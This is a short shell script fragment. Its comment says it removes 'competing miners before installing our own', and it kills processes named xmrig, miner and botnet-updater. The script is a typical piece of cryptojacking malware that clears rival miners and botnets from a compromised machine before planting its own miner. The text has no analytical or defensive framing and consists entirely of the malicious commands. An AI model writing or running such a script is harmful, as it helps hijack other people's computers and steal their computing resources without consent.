#!/bin/sh
# Remove competing miners before installing our own.
pkill -f xmrig
killall miner
killall -9 botnet-updater
